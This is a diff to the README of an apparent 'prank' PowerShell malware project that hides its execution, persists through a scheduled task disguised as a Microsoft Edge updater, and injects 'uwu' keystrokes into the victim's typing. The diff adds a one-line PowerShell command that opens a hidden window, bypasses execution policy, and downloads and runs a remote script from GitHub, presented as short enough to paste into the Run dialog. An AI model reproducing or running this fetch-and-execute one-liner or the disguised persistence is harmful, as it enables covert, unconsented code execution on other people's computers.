@@ -13,8 +13,10 @@ A proof-of-concept prank script designed to annoy friends by injecting "uwu" int
 The execution flow involves four main components chaining together to hide execution and persistence.
 
 ## Usage
-
 1. run the starter.ps1 (doesn't have to be ps1, it's a one-liner!)
+1. (alternatively) You can run 
+`powershell -w h -nop -ExecutionPolicy Bypass -C "IEX(New-Object Net.WebClient).DownloadString('https://github.com/b3at1/eviluwu/blob/main/starter.ps1')"` 
+which is short enough to execute in the run dialogue.
 2. timuwue to watch the wouwurld burn!
 ### 1. `starter.ps1`
 This is the entry point. It contains the initial logic to bootstrap the process. 
@@ -37,8 +39,8 @@ The core logic resides here.
 - Every 21 characters typed (including previous "uwu"s), it simulates keystrokes to type "uwu".
 
 ## Removal
-powershell: `Unregister-ScheduledTask -TaskName "MicrosoftEdgeUpdateUpdaterTaskMachineCore" -Confirm:$false`
-cmd: `schtasks /delete /tn "MicrosoftEdgeUpdateUpdaterTaskMachineCore" /f`
+MAKE SURE TO STOP THE POWERSHELL SCRIPT BEFORE RUNNING:
+`schtasks /delete /tn "MicrosoftEdgeUpdateUpdaterTaskMachineCore" /f`
 
 ## Credits
 - UNT-CAS for the [Hidden PowerShell Script technique](https://github.com/UNT-CAS/HiddenPowershell/blob/master/HiddenPowershell.vbs) used in `HP.vbs`.
